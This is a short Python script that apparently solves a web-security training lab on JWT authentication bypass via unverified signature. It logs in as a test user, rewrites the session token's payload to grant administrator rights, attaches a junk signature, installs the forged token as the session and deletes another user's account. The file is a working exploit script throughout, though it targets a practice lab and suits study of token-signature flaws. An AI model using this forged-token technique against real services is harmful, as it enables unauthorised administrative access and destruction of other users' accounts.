import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))
from common import become_admin_payload, delete_carlos, encode_unsigned, get_session_token, lab_session, set_session


lab = lab_session("JWT authentication bypass via unverified signature")
lab.login("wiener", "peter")

header, payload = become_admin_payload(get_session_token(lab))
forged = encode_unsigned(header, payload) + ".junk"

set_session(lab, forged)
delete_carlos(lab)

